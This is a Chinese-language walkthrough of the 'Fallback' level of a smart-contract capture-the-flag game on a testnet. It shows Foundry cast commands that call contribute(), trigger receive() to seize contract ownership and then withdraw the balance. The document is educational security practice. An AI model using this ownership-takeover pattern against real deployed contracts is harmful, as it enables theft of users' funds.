### 第1关：Fallback

这一题主要是讲解 receive() 函数。在以太坊智能合约中，receive 函数是一个特殊的函数，用于接收以太币。当合约地址接收到以太币时，这个函数会被自动调用。

如以下代码所示，我们先要调用 contribute() ，在 contributions 里留下自己的记录。
```solidity
function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }
```
先点击 Get new instance, F12 查看本关的合约地址 0xAAAAAAAAAAAAAAAAAAAA ，然后使用 Foundry Cast 调用 contribute() , 并带上 小于 0.001 ether 的 msg.value ：

 ```shell
cast send 0xAAAAAAAAAAAAAAAAAAAA "contribute()" --value=0.0001ether --rpc-url=https://sepolia-rollup.arbitrum.io/rpc --private-key=XXXXXXX
```
然后参照如下代码，向合约发送一些 eth，以触发receive()。
 ```solidity
 receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
```
执行
 ```shell
cast send 0xAAAAAAAAAAAAAAAAAAAA --value=0.000001ether --rpc-url=https://sepolia-rollup.arbitrum.io/rpc --private-key=XXXXXXX
```
这时我们查看合约的 owner，已经变成了自己的地址：

 ```shell
cast call 0xAAAAAAAAAAAAAAAAAAAA  "owner()" --rpc-url=https://sepolia-rollup.arbitrum.io/rpc
```

然后执行 withdraw():

 ```shell
cast send 0xAAAAAAAAAAAAAAAAAAAA "withdraw()" --rpc-url=https://sepolia-rollup.arbitrum.io/rpc --private-key=XXXXXXX
```

 点击 Submit Instance, 过关。
